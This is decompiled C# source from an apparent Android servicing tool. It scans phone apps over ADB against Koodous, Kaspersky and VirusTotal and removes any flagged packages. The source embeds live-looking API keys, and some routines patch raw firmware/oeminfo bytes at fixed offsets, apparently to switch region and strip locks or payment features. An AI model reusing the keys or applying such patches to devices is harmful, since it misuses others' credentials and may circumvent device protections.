											analisis.Suspicious,
											analisis.Undetected,
											Environment.NewLine
										}));
										string resultadoAccion = "";
										if (Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(this.chkSoloDesactivar.Invoke(new VB$AnonymousDelegate_1<bool>(() => this.chkSoloDesactivar.Checked)))))
										{
											resultadoAccion = this.ExecuteAdbCommand(string.Format("shell pm disable-user --user 0 {0}", paquete), selectedDevice);
											this.AppendColoredText(this.txtOutput, string.Format("\ud83d\udeab Desactivado: {0} → {1}", paquete, resultadoAccion.Trim()), Color.Orange);
										}
										else
										{
											resultadoAccion = this.ExecuteAdbCommand(string.Format("shell pm uninstall --user 0 {0}", paquete), selectedDevice);
											this.AppendColoredText(this.txtOutput, string.Format("\ud83d\uddd1️ Eliminado: {0} → {1}", paquete, resultadoAccion.Trim()), Color.Red);
										}
									}
									else
									{
										limpias++;
										this.AppendColoredText(this.txtOutput, string.Format("✔️ Limpio: {0}", paquete), Color.Green);
									}
								}
							}
						}
					}
				}
				this.txtOutput.AppendText(Environment.NewLine + "\ud83d\udcca Resumen del escaneo:" + Environment.NewLine);
				this.txtOutput.AppendText(string.Format("\ud83d\udd0d Revisadas: {0}", totalRevisadas) + Environment.NewLine);
				this.txtOutput.AppendText(string.Format("✔️ Limpias: {0}", limpias) + Environment.NewLine);
				this.txtOutput.AppendText(string.Format("\ud83d\uddd1️ Eliminadas/Desactivadas: {0}", eliminadas.Count) + Environment.NewLine);
				this.txtOutput.AppendText(string.Format("❌ Errores / no procesadas: {0}", errores) + Environment.NewLine);
				File.AppendAllText(rutaArchivo, Environment.NewLine + "✅ Fin del escaneo con eliminación." + Environment.NewLine);
			}
		}

		// Token: 0x060000C2 RID: 194 RVA: 0x0000BAA4 File Offset: 0x00009CA4
		private void AppendColoredText(RichTextBox rtb, string text, Color color)
		{
			rtb.Invoke(new VB$AnonymousDelegate_0(delegate()
			{
				rtb.SelectionStart = rtb.TextLength;
				rtb.SelectionColor = color;
				rtb.AppendText(text + Environment.NewLine);
				rtb.SelectionColor = rtb.ForeColor;
			}));
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x0000BAE8 File Offset: 0x00009CE8
		public async Task<Form1.VirusAnalysisResult> ConsultarVirusTotalDetalles(string packageName, string apiKey)
		{
			Form1.VirusAnalysisResult result = new Form1.VirusAnalysisResult();
			try
			{
				using (HttpClient client = new HttpClient())
				{
					client.DefaultRequestHeaders.Add("x-apikey", apiKey);
					string searchUrl = string.Format("https://www.virustotal.com/api/v3/search?query=package:{0}", packageName);
					HttpResponseMessage searchResponse = await client.GetAsync(searchUrl);
					if (!searchResponse.IsSuccessStatusCode)
					{
						return result;
					}
					string searchJson = await searchResponse.Content.ReadAsStringAsync();
					JObject searchData = JObject.Parse(searchJson);
					JToken jtoken = searchData["data"];
					string text;
					if (jtoken == null)
					{
						text = null;
					}
					else
					{
						JToken first = jtoken.First;
						if (first == null)
						{
							text = null;
						}
						else
						{
							JToken jtoken2 = first["id"];
							text = ((jtoken2 != null) ? jtoken2.ToString() : null);
						}
					}
					string sha256 = text;
					if (string.IsNullOrEmpty(sha256))
					{
						return result;
					}
					result.SHA256 = sha256;
					string fileUrl = string.Format("https://www.virustotal.com/api/v3/files/{0}", sha256);
					HttpResponseMessage fileResponse = await client.GetAsync(fileUrl);
					if (!fileResponse.IsSuccessStatusCode)
					{
						return result;
					}
					string fileJson = await fileResponse.Content.ReadAsStringAsync();
					JObject data = JObject.Parse(fileJson);
					JToken jtoken3 = data["data"];
					JToken jtoken4;
					if (jtoken3 == null)
					{
						jtoken4 = null;
					}
					else
					{
						JToken jtoken5 = jtoken3["attributes"];
						jtoken4 = ((jtoken5 != null) ? jtoken5["last_analysis_stats"] : null);
					}
					JToken stats = jtoken4;
					Form1.VirusAnalysisResult virusAnalysisResult = result;
					int? num;
					if (stats == null)
					{
						num = null;
					}
					else
					{
						JToken jtoken6 = stats["malicious"];
						num = ((jtoken6 != null) ? new int?(jtoken6.ToObject<int>()) : null);
					}
					int? num2 = num;
					virusAnalysisResult.Malicious = num2.Value;
					Form1.VirusAnalysisResult virusAnalysisResult2 = result;
					int? num3;
					if (stats == null)
					{
						num3 = null;
					}
					else
					{
						JToken jtoken7 = stats["suspicious"];
						num3 = ((jtoken7 != null) ? new int?(jtoken7.ToObject<int>()) : null);
					}
					num2 = num3;
					virusAnalysisResult2.Suspicious = num2.Value;
					Form1.VirusAnalysisResult virusAnalysisResult3 = result;
					int? num4;
					if (stats == null)
					{
						num4 = null;
					}
					else
					{
						JToken jtoken8 = stats["undetected"];
						num4 = ((jtoken8 != null) ? new int?(jtoken8.ToObject<int>()) : null);
					}
					num2 = num4;
					virusAnalysisResult3.Undetected = num2.Value;
					if (result.Malicious > 0 || result.Suspicious > 0)
					{
						result.IsThreat = true;
					}
				}
			}
			catch (Exception ex)
			{
				this.txtOutput.AppendText(string.Format("❌ Error al consultar {0}: {1}", packageName, ex.Message) + Environment.NewLine);
			}
			return result;
		}

		// Token: 0x060000C4 RID: 196 RVA: 0x0000BB3C File Offset: 0x00009D3C
		public async Task<Form1.VirusAnalysisResult> ConsultarVirusTotalDetallesSHA256(string sha256, string apiKey)
		{
			Form1.VirusAnalysisResult result = new Form1.VirusAnalysisResult
			{
				SHA256 = sha256
			};
			try
			{
				using (HttpClient client = new HttpClient())
				{
					client.DefaultRequestHeaders.Add("x-apikey", apiKey);
					string fileUrl = string.Format("https://www.virustotal.com/api/v3/files/{0}", sha256);
					HttpResponseMessage fileResponse = await client.GetAsync(fileUrl);
					if (!fileResponse.IsSuccessStatusCode)
					{
						return result;
					}
					string fileJson = await fileResponse.Content.ReadAsStringAsync();
					JObject data = JObject.Parse(fileJson);
					JToken jtoken = data["data"];
					JToken jtoken2;
					if (jtoken == null)
					{
						jtoken2 = null;
					}
					else
					{
						JToken jtoken3 = jtoken["attributes"];
						jtoken2 = ((jtoken3 != null) ? jtoken3["last_analysis_stats"] : null);
					}
					JToken stats = jtoken2;
					Form1.VirusAnalysisResult virusAnalysisResult = result;
					int? num;
					if (stats == null)
					{
						num = null;
					}
					else
					{
						JToken jtoken4 = stats["malicious"];
						num = ((jtoken4 != null) ? new int?(jtoken4.ToObject<int>()) : null);
					}
					int? num2 = num;
					virusAnalysisResult.Malicious = num2.Value;
					Form1.VirusAnalysisResult virusAnalysisResult2 = result;
					int? num3;
					if (stats == null)
					{
						num3 = null;
					}
					else
					{
						JToken jtoken5 = stats["suspicious"];
						num3 = ((jtoken5 != null) ? new int?(jtoken5.ToObject<int>()) : null);
					}
					num2 = num3;
					virusAnalysisResult2.Suspicious = num2.Value;
					Form1.VirusAnalysisResult virusAnalysisResult3 = result;
					int? num4;
					if (stats == null)
					{
						num4 = null;
					}
					else
					{
						JToken jtoken6 = stats["undetected"];
						num4 = ((jtoken6 != null) ? new int?(jtoken6.ToObject<int>()) : null);
					}
					num2 = num4;
					virusAnalysisResult3.Undetected = num2.Value;
					if (result.Malicious > 0 || result.Suspicious > 0)
					{
						result.IsThreat = true;
					}
				}
			}
			catch (Exception ex)
			{
				this.txtOutput.AppendText(string.Format("❌ Error al consultar hash: {0} → {1}", sha256, ex.Message) + Environment.NewLine);
			}
			return result;
		}

		// Token: 0x060000C5 RID: 197 RVA: 0x0000BB8E File Offset: 0x00009D8E
		private void btnConsultarKoodousPorHash_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			this.InitializeProgressBar(2);
			Task.Run(async delegate()
			{
				try
				{
					List<string> devices = this.GetAdbDevices();
					bool flag = devices.Count == 0 || this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_1<object>(() => this.cmbDevicesAdb.SelectedItem)) == null;
					if (flag)
					{
						this.Invoke((Form1._Closure$__.$I159-2 == null) ? (Form1._Closure$__.$I159-2 = delegate()
						{
							MessageBox.Show("Conecta un dispositivo.");
						}) : Form1._Closure$__.$I159-2);
						return;
					}
					string selectedDevice = "";
					this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					}));
					string apiKey = "e91683e400e40e5e7a7126cc02707954393d00c8";
					await this.VerificarKoodousPorHash(selectedDevice, apiKey);
				}
				catch (Exception $VB$Local_ex)
				{
					Exception ex = $VB$Local_ex;
					this.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						MessageBox.Show("Error: " + ex.Message);
					}));
				}
				this.UpdateProgressBar();
			});
		}

		// Token: 0x060000C6 RID: 198 RVA: 0x0000BBB4 File Offset: 0x00009DB4
		public async Task VerificarKoodousPorHash(string selectedDevice, string apiKey)
		{
			string rutaLogs = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Logs");
			bool flag = !Directory.Exists(rutaLogs);
			if (flag)
			{
				Directory.CreateDirectory(rutaLogs);
			}
			string rutaArchivo = Path.Combine(rutaLogs, "koodous_hash_log.txt");
			File.AppendAllText(rutaArchivo, string.Format("{0}\ud83d\udd0e {1} - Verificación Koodous por hash{2}", Environment.NewLine, DateAndTime.Now, Environment.NewLine));
			this.txtOutput.AppendText("\ud83d\udd0e Iniciando verificación de apps con hash en Koodous..." + Environment.NewLine);
			string salida = this.ExecuteAdbCommandTest(string.Format("-s {0} shell pm list packages -3", selectedDevice));
			string[] paquetes = salida.Split(new string[]
			{
				Environment.NewLine
			}, StringSplitOptions.RemoveEmptyEntries);
			foreach (string linea in paquetes)
			{
				string paquete = linea.Replace("package:", "").Trim();
				bool flag2 = Operators.CompareString(paquete, "", false) == 0;
				if (!flag2)
				{
					string apkPath = this.ObtenerRutaApk(paquete, selectedDevice);
					bool flag3 = Operators.CompareString(apkPath, "", false) == 0;
					if (!flag3)
					{
						string tempApk = Path.Combine(Path.GetTempPath(), string.Format("{0}.apk", paquete));
						bool flag4 = !this.DescargarApk(apkPath, tempApk, selectedDevice);
						if (!flag4)
						{
							string hash = this.CalcularSHA256(tempApk);
							File.AppendAllText(rutaArchivo, string.Format("\ud83d\udd11 SHA256 {0}: {1}", paquete, hash) + Environment.NewLine);
							bool esMalicioso = await this.ConsultarKoodousPorHash(hash, apiKey);
							if (esMalicioso)
							{
								string mensaje = string.Format("☣️ Detectado como malware en Koodous: {0}", paquete);
								this.txtOutput.AppendText(mensaje + Environment.NewLine);
								File.AppendAllText(rutaArchivo, mensaje + Environment.NewLine);
								string uninstallResult = this.ExecuteAdbCommandTest(string.Format("-s {0} shell pm uninstall --user 0 {1}", selectedDevice, paquete));
								string msg = string.Format("\ud83d\uddd1️ Eliminado: {0} → {1}", paquete, uninstallResult.Trim());
								this.txtOutput.AppendText(msg + Environment.NewLine);
								File.AppendAllText(rutaArchivo, msg + Environment.NewLine);
							}
							else
							{
								this.AppendColoredText(this.txtOutput, string.Format("✔️ Limpio: {0}", paquete), Color.Green);
								File.AppendAllText(rutaArchivo, string.Format("✔️ Limpio: {0}", paquete) + Environment.NewLine);
							}
							if (File.Exists(tempApk))
							{
								File.Delete(tempApk);
							}
						}
					}
				}
			}
			this.txtOutput.AppendText("✅ Finalizado escaneo Koodous por hash." + Environment.NewLine);
			File.AppendAllText(rutaArchivo, "✅ Fin del escaneo Koodous por hash." + Environment.NewLine);
		}

		// Token: 0x060000C7 RID: 199 RVA: 0x0000BC08 File Offset: 0x00009E08
		public async Task<bool> ConsultarKoodousPorHash(string sha256, string apiKey)
		{
			try
			{
				using (HttpClient client = new HttpClient())
				{
					client.DefaultRequestHeaders.Add("Authorization", string.Format("Token {0}", apiKey));
					string url = string.Format("https://api.koodous.com/apks/{0}", sha256);
					HttpResponseMessage response = await client.GetAsync(url);
					if (response.IsSuccessStatusCode)
					{
						string json = await response.Content.ReadAsStringAsync();
						return json.Contains("\"verdict\":\"malware\"") | json.Contains("\"malware\":true");
					}
				}
			}
			catch (Exception ex)
			{
				this.txtOutput.AppendText(string.Format("❌ Error consultando {0} en Koodous: {1}", sha256, ex.Message) + Environment.NewLine);
			}
			return false;
		}

		// Token: 0x060000C8 RID: 200 RVA: 0x0000BC5C File Offset: 0x00009E5C
		public string ObtenerRutaApk(string packageName, string selectedDevice)
		{
			string text = this.ExecuteAdbCommandTest(string.Format("-s {0} shell pm path {1}", selectedDevice, packageName));
			bool flag = text.Contains("package:");
			string result;
			if (flag)
			{
				result = text.Replace("package:", "").Trim();
			}
			else
			{
				result = "";
			}
			return result;
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x0000BCB0 File Offset: 0x00009EB0
		public bool DescargarApk(string apkPath, string localPath, string selectedDevice)
		{
			string text = this.ExecuteAdbCommandTest(string.Format("-s {0} pull \"{1}\" \"{2}\"", selectedDevice, apkPath, localPath));
			return text.ToLower().Contains("pulled") | text.ToLower().Contains("1 file pulled");
		}

		// Token: 0x060000CA RID: 202 RVA: 0x0000BCF8 File Offset: 0x00009EF8
		public string CalcularSHA256(string rutaArchivo)
		{
			string result;
			using (SHA256 sha = SHA256.Create())
			{
				using (FileStream fileStream = File.OpenRead(rutaArchivo))
				{
					byte[] value = sha.ComputeHash(fileStream);
					result = BitConverter.ToString(value).Replace("-", "").ToLowerInvariant();
				}
			}
			return result;
		}

		// Token: 0x060000CB RID: 203 RVA: 0x0000BD70 File Offset: 0x00009F70
		public string ExecuteAdbCommandTest(string command)
		{
			string result;
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo("adb", command)
				{
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using (Process process = Process.Start(startInfo))
				{
					string str = process.StandardOutput.ReadToEnd();
					string text = process.StandardError.ReadToEnd();
					process.WaitForExit();
					result = str + ((!string.IsNullOrWhiteSpace(text)) ? ("\r\nError: " + text) : "");
				}
			}
			catch (Exception ex)
			{
				result = string.Format("❌ Error ejecutando ADB: {0}", ex.Message);
			}
			return result;
		}

		// Token: 0x060000CC RID: 204 RVA: 0x0000BE44 File Offset: 0x0000A044
		public async Task<bool> ConsultarKaspersky(string hashSha256, string apiKey)
		{
			try
			{
				bool flag = string.IsNullOrWhiteSpace(hashSha256) || hashSha256.Length != 64;
				if (flag)
				{
					this.txtOutput.AppendText(string.Format("⚠️ Hash inválido: {0}", hashSha256) + Environment.NewLine);
					return false;
				}
				using (HttpClient client = new HttpClient())
				{
					client.DefaultRequestHeaders.Add("x-api-key", apiKey);
					client.DefaultRequestHeaders.UserAgent.ParseAdd("TSFixVirusScanner/1.0");
					string url = string.Format("https://opentip.kaspersky.com/api/v1/search/hash?request={0}", hashSha256);
					HttpResponseMessage response = await client.GetAsync(url);
					if (response.IsSuccessStatusCode)
					{
						string json = await response.Content.ReadAsStringAsync();
						JObject data = JObject.Parse(json);
						JToken jtoken = data["Zone"];
						string text;
						if (jtoken == null)
						{
							text = null;
						}
						else
						{
							string text2 = jtoken.ToString();
							text = ((text2 != null) ? text2.ToLower() : null);
						}
						string zone = text;
						JToken jtoken2 = data["FileStatus"];
						string text3;
						if (jtoken2 == null)
						{
							text3 = null;
						}
						else
						{
							string text4 = jtoken2.ToString();
							text3 = ((text4 != null) ? text4.ToLower() : null);
						}
						string fileStatus = text3;
						if (Operators.CompareString(zone, "red", false) == 0 || Operators.CompareString(fileStatus, "malware", false) == 0)
						{
							this.AppendColoredText(this.txtOutput, string.Format("☣️ Detectado por Kaspersky: {0} → {1}", hashSha256, (fileStatus != null) ? fileStatus.ToUpper() : null), Color.Red);
							return true;
						}
						if (Operators.CompareString(zone, "yellow", false) == 0 || Operators.CompareString(fileStatus, "adware and other", false) == 0)
						{
							this.AppendColoredText(this.txtOutput, string.Format("⚠️ Potencialmente no deseado: {0} → {1}", hashSha256, (fileStatus != null) ? fileStatus.ToUpper() : null), Color.Orange);
							return true;
						}
						this.AppendColoredText(this.txtOutput, string.Format("✔️ Limpio en Kaspersky: {0}", hashSha256), Color.Green);
						return false;
					}
					else
					{
						this.txtOutput.AppendText(string.Format("❌ Error al consultar hash en Kaspersky: {0}", response.StatusCode) + Environment.NewLine);
					}
				}
			}
			catch (Exception ex)
			{
				this.txtOutput.AppendText(string.Format("❌ Excepción Kaspersky: {0}", ex.Message) + Environment.NewLine);
			}
			return false;
		}

		// Token: 0x060000CD RID: 205 RVA: 0x0000BE98 File Offset: 0x0000A098
		public async Task RevisarConKaspersky(string selectedDevice, string apiKey)
		{
			string resultado = this.ExecuteAdbCommand("shell pm list packages -f", selectedDevice);
			string[] paquetes = resultado.Split(new string[]
			{
				Environment.NewLine
			}, StringSplitOptions.RemoveEmptyEntries);
			foreach (string linea in paquetes)
			{
				string[] partes = linea.Replace("package:", "").Split(new char[]
				{
					'='
				});
				bool flag = partes.Length < 2;
				if (!flag)
				{
					string rutaApk = partes[0].Trim();
					string nombrePaquete = partes[1].Trim();
					bool flag2 = rutaApk.Contains("/vendor/overlay/") || rutaApk.Contains("-");
					if (flag2)
					{
						this.AppendColoredText(this.txtOutput, string.Format("⚠️ Entrada ignorada (dinámica o overlay): {0}", linea), Color.Orange);
					}
					else
					{
						string apkLocal = Path.Combine(Path.GetTempPath(), string.Format("{0}.apk", nombrePaquete));
						this.ExecuteAdbCommand(string.Format("pull {0} \"{1}\"", rutaApk, apkLocal), selectedDevice);
						bool flag3 = !File.Exists(apkLocal);
						if (flag3)
						{
							this.AppendColoredText(this.txtOutput, string.Format("❌ No se pudo extraer el APK: {0}", rutaApk), Color.Red);
						}
						else
						{
							string sha256 = this.CalcularSHA256(apkLocal);
							File.Delete(apkLocal);
							bool flag4 = !string.IsNullOrEmpty(sha256);
							if (flag4)
							{
								await this.ConsultarKaspersky(sha256, apiKey);
							}
						}
					}
				}
			}
			this.txtOutput.AppendText(Environment.NewLine + "✅ Escaneo con Kaspersky finalizado." + Environment.NewLine);
		}

		// Token: 0x060000CE RID: 206 RVA: 0x0000BEEA File Offset: 0x0000A0EA
		private void btnRevisarKaspersky_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			this.InitializeProgressBar(2);
			Task.Run(async delegate()
			{
				try
				{
					List<string> devices = this.GetAdbDevices();
					bool flag = devices.Count == 0 || this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_1<object>(() => this.cmbDevicesAdb.SelectedItem)) == null;
					if (flag)
					{
						this.Invoke((Form1._Closure$__.$I168-2 == null) ? (Form1._Closure$__.$I168-2 = delegate()
						{
							MessageBox.Show("Conecta un dispositivo.");
						}) : Form1._Closure$__.$I168-2);
						return;
					}
					string selectedDevice = "";
					this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					}));
					string apiKeyKaspersky = "hWewDUlDSsSEQk57HNYPGA==";
					await this.RevisarConKaspersky(selectedDevice, apiKeyKaspersky);
				}
				catch (Exception $VB$Local_ex)
				{
					Exception ex = $VB$Local_ex;
					this.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						MessageBox.Show("Error: " + ex.Message);
					}));
				}
				this.UpdateProgressBar();
			});
		}

		// Token: 0x060000CF RID: 207 RVA: 0x0000BF10 File Offset: 0x0000A110
		public void MostrarSoloBloqueosDispositivo(string nombreProceso, string selectedDevice)
		{
			Dictionary<string, string> dictionary = this.ObtenerDiccionarioBloqueos();
			this.txtOutput.AppendText(string.Format("{0} para {1}:{2}", nombreProceso, selectedDevice, Environment.NewLine));
			try
			{
				foreach (KeyValuePair<string, string> keyValuePair in dictionary)
				{
					string text = this.ExecuteAdbCommand(string.Format("shell pm list packages {0}", keyValuePair.Value), selectedDevice);
					bool flag = text.Contains(keyValuePair.Value);
					if (flag)
					{
						this.txtOutput.AppendText(string.Format("\ud83d\udd12 {0}: Detectado {1}", keyValuePair.Key, Environment.NewLine));
					}
				}
			}
			finally
			{
				Dictionary<string, string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			this.txtOutput.AppendText("✅ Consulta completada." + Environment.NewLine);
		}

		// Token: 0x060000D0 RID: 208 RVA: 0x0000BFF0 File Offset: 0x0000A1F0
		private void OutputDataReceivedHandler(object sender, DataReceivedEventArgs e)
		{
			bool flag = !string.IsNullOrEmpty(e.Data);
			if (flag)
			{
				this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.txtOutput.AppendText(string.Format("{0}{1}", e.Data, Environment.NewLine));
				}));
			}
		}

		// Token: 0x060000D1 RID: 209 RVA: 0x0000C044 File Offset: 0x0000A244
		private void btnBuscarYEditar_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				OpenFileDialog openFileDialog = new OpenFileDialog
				{
					Filter = "Archivos binarios (*.bin)|*.bin|Todos los archivos (*.*)|*.*",
					Title = "Selecciona el archivo a editar"
				};
				this.UpdateProgressBar();
				bool flag2 = openFileDialog.ShowDialog() == DialogResult.OK;
				if (flag2)
				{
					string fileName = openFileDialog.FileName;
					this.BuscarYEditarOffset(fileName);
				}
				this.UpdateProgressBar();
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
			}
		}

		// Token: 0x060000D2 RID: 210 RVA: 0x0000C118 File Offset: 0x0000A318
		private void BuscarYEditarOffset(string filePath)
		{
			checked
			{
				try
				{
					byte[] array = File.ReadAllBytes(filePath);
					int num = 790528;
					int num2 = 790595;
					byte[] array2 = new byte[]
					{
						97,
						99,
						116,
						105,
						118,
						101
					};
					bool flag = false;
					int num3 = num;
					int num4 = num2 - array2.Length;
					for (int i = num3; i <= num4; i++)
					{
						bool flag2 = array2.SequenceEqual(array.Skip(i).Take(array2.Length));
						if (flag2)
						{
							flag = true;
							break;
						}
					}
					bool flag3 = flag;
					if (flag3)
					{
						int num5 = num;
						int num6 = num2 - 1;
						for (int j = num5; j <= num6; j++)
						{
							array[j] = 0;
						}
					}
					int num7 = 792568;
					bool flag4 = false;
					bool flag5 = num7 < array.Length && array[num7] == 1;
					if (flag5)
					{
						array[num7] = 58;
						flag4 = true;
					}
					int num8 = 804352;
					int num9 = 805232;
					byte[] array3 = new byte[]
					{
						61,
						61
					};
					bool flag6 = false;
					int num10 = num8;
					int num11 = num9 - array3.Length;
					for (int k = num10; k <= num11; k++)
					{
						bool flag7 = array3.SequenceEqual(array.Skip(k).Take(array3.Length));
						if (flag7)
						{
							flag6 = true;
							break;
						}
					}
					bool flag8 = flag6;
					if (flag8)
					{
						int num12 = num8;
						int num13 = num9;
						for (int l = num12; l <= num13; l++)
						{
							array[l] = 0;
						}
					}
					int num14 = 10500;
					byte[] array4 = new byte[]
					{
						20,
						194,
						29,
						104
					};
					byte[] array5 = new byte[]
					{
						141,
						125,
						222,
						103
					};
					bool flag9 = false;
					bool flag10 = num14 + array4.Length <= array.Length;
					if (flag10)
					{
						bool flag11 = true;
						int num15 = array4.Length - 1;
						for (int m = 0; m <= num15; m++)
						{
							bool flag12 = array[num14 + m] != array4[m];
							if (flag12)
							{
								flag11 = false;
								break;
							}
						}
						bool flag13 = flag11;
						if (flag13)
						{
							int num16 = array5.Length - 1;
							for (int n = 0; n <= num16; n++)
							{
								array[num14 + n] = array5[n];
							}
							flag9 = true;
						}
					}
					int num17 = 790599;
					byte[] array6 = new byte[]
					{
						26,
						49,
						55,
						52,
						54,
						55,
						56,
						48,
						54,
						56,
						55
					};
					byte[] array7 = new byte[11];
					bool flag14 = false;
					bool flag15 = num17 + array6.Length <= array.Length;
					if (flag15)
					{
						bool flag16 = true;
						int num18 = array6.Length - 1;
						for (int num19 = 0; num19 <= num18; num19++)
						{
							bool flag17 = array[num17 + num19] != array6[num19];
							if (flag17)
							{
								flag16 = false;
								break;
							}
						}
						bool flag18 = flag16;
						if (flag18)
						{
							int num20 = array7.Length - 1;
							for (int num21 = 0; num21 <= num20; num21++)
							{
								array[num17 + num21] = array7[num21];
							}
							flag14 = true;
						}
					}
					int num22 = 790690;
					byte[] array8 = new byte[]
					{
						56,
						54,
						52,
						48,
						48
					};
					byte[] array9 = new byte[5];
					bool flag19 = false;
					bool flag20 = num22 + array8.Length <= array.Length;
					if (flag20)
					{
						bool flag21 = true;
						int num23 = array8.Length - 1;
						for (int num24 = 0; num24 <= num23; num24++)
						{
							bool flag22 = array[num22 + num24] != array8[num24];
							if (flag22)
							{
								flag21 = false;
								break;
							}
						}
						bool flag23 = flag21;
						if (flag23)
						{
							int num25 = array9.Length - 1;
							for (int num26 = 0; num26 <= num25; num26++)
							{
								array[num22 + num26] = array9[num26];
							}
							flag19 = true;
						}
					}
					int num27 = 790698;
					byte[] array10 = new byte[]
					{
						56,
						54,
						52,
						48,
						48
					};
					byte[] array11 = new byte[5];
					bool flag24 = false;
					bool flag25 = num27 + array10.Length <= array.Length;
					if (flag25)
					{
						bool flag26 = true;
						int num28 = array10.Length - 1;
						for (int num29 = 0; num29 <= num28; num29++)
						{
							bool flag27 = array[num27 + num29] != array10[num29];
							if (flag27)
							{
								flag26 = false;
								break;
							}
						}
						bool flag28 = flag26;
						if (flag28)
						{
							int num30 = array11.Length - 1;
							for (int num31 = 0; num31 <= num30; num31++)
							{
								array[num27 + num31] = array11[num31];
							}
							flag24 = true;
						}
					}
					string arg = "Desconocido";
					int num32 = 0;
					for (;;)
					{
						bool flag29 = num32 + 1 < array.Length && array[num32] == 80 && array[num32 + 1] == 83;
						if (flag29)
						{
							break;
						}
						num32++;
						if (num32 > 64)
						{
							goto IL_475;
						}
					}
					bool flag30 = num32 + 17 < array.Length;
					if (flag30)
					{
						byte[] bytes = array.Skip(num32 + 2).Take(16).ToArray<byte>();
						arg = Encoding.ASCII.GetString(bytes).Trim(new char[1]);
					}
					IL_475:
					bool flag31 = flag || flag4 || flag6 || flag9 || flag14 || flag19 || flag24;
					if (flag31)
					{
						string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(filePath);
						string text = string.Format("{0}_{1}_edit.bin", fileNameWithoutExtension, arg);
						string path = Path.Combine(Path.GetDirectoryName(filePath), text);
						File.WriteAllBytes(path, array);
						MessageBox.Show(string.Format("Archivo guardado como: {0}", text), "Éxito", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
					else
					{
						MessageBox.Show("No se detectaron patrones a modificar.", "Sin cambios", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show("Error durante la edición del archivo: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
		}

		// Token: 0x060000D3 RID: 211 RVA: 0x0000C670 File Offset: 0x0000A870
		private void BtnPatchFileHonor_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "Archivos OEMINFO|oeminfo.bin;oeminfo.img;oeminfo",
				Title = "Selecciona el archivo OEMINFO"
			};
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				string fileName = openFileDialog.FileName;
				string left = Path.GetFileNameWithoutExtension(fileName).ToLower();
				bool flag2 = Operators.CompareString(left, "oeminfo", false) != 0;
				if (flag2)
				{
					MessageBox.Show("Debes seleccionar un archivo llamado 'oeminfo', con o sin extensión (.bin o .img).", "Archivo incorrecto", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				}
				else
				{
					this.ReemplazarDefPorUsaSeguro(fileName);
				}
			}
		}

		// Token: 0x060000D4 RID: 212 RVA: 0x0000C6F4 File Offset: 0x0000A8F4
		private bool ReemplazarDefPorUsaSeguro(string filePath)
		{
			checked
			{
				bool result;
				try
				{
					bool flag = !File.Exists(filePath);
					if (flag)
					{
						MessageBox.Show("El archivo seleccionado no existe.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
						result = false;
					}
					else
					{
						StringBuilder stringBuilder = new StringBuilder();
						byte[] array = File.ReadAllBytes(filePath);
						byte[] array2 = new byte[]
						{
							100,
							101,
							102,
							47
						};
						byte[] array3 = new byte[]
						{
							117,
							115,
							97,
							47
						};
						int num = 8393216;
						bool flag2 = false;
						int num2 = 553472;
						string text = "MODELO";
						bool flag3 = num2 + 16 < array.Length;
						if (flag3)
						{
							text = Encoding.ASCII.GetString(array, num2, 16);
							text = new string(text.TakeWhile((Form1._Closure$__.$I175-0 == null) ? (Form1._Closure$__.$I175-0 = ((char c) => char.IsLetterOrDigit(c) || c == '-')) : Form1._Closure$__.$I175-0).ToArray<char>());
							bool flag4 = string.IsNullOrWhiteSpace(text);
							if (flag4)
							{
								text = "UNKNOWN";
							}
						}
						stringBuilder.AppendLine(string.Format("\ud83d\udcc4 Modelo extraído: {0}", text));
						string text2 = Path.Combine(Path.GetDirectoryName(filePath), string.Format("oeminfo_{0}.bin.bak", text));
						try
						{
							File.Copy(filePath, text2, true);
							stringBuilder.AppendLine(string.Format("✅ Respaldo creado: {0}", Path.GetFileName(text2)));
						}
						catch (Exception ex)
						{
							MessageBox.Show("Error al crear respaldo: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
							return false;
						}
						bool flag5 = num + array2.Length <= array.Length;
						if (flag5)
						{
							bool flag6 = array.Skip(num).Take(array2.Length).SequenceEqual(array2);
							if (flag6)
							{
								int num3 = array3.Length - 1;
								for (int i = 0; i <= num3; i++)
								{
									array[num + i] = array3[i];
								}
								stringBuilder.AppendLine("✏️ Cambio aplicado. Ya no tiene Pay");
								flag2 = true;
							}
						}
						bool flag7 = !flag2;
						if (flag7)
